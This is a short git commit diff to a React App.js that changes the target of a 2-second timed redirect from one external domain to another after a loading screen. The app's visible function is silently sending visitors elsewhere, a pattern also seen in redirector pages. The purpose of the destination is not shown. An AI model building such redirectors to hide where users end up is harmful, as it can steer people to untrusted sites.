75bc1e88b8b5f21de5f11a20094d3c0dbabc9bb6
husknet <127146284+husknet@users.noreply.github.com>
2024-11-18 17:05:48 +0000

    Update App.js

--- src/App.js
+++ src/App.js
@@ -4,7 +4,7 @@ import Loading from './Loading';
 function App() {
     useEffect(() => {
         const timer = setTimeout(() => {
-            window.location.href = 'https://blackguts.vercel.app';
+            window.location.href = 'https://em.jrconsulting.cl';
         }, 2000);
 
         return () => clearTimeout(timer);
